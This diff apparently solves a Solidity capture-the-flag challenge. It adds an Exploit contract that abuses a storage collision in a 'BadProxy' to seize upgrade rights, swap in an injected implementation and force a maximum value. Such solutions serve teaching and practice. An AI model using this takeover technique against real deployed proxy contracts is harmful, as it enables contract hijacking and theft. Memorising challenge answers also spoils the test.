@@ -18,7 +18,7 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-
+        new Exploit(setup).execute();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
@@ -27,5 +27,28 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Exploit {
+    Setup setup;
 
+    constructor(Setup setup_) {
+        setup = setup_;
+    }
+
+    function execute() external {
+        setup.counter().setNumber(uint256(uint160(address(this))));
+
+        InjectContract injectContract = new InjectContract();
+
+        BadProxy(address(setup.counter())).upgradeTo(address(injectContract));
+        InjectContract(address(setup.counter())).setMaxValue();
+    }
+}
+
+contract InjectContract {
+    uint256 public number;
+
+    function setMaxValue() external {
+        number = type(uint256).max;
+    }
+}
 ////////// YOUR CODE END //////////
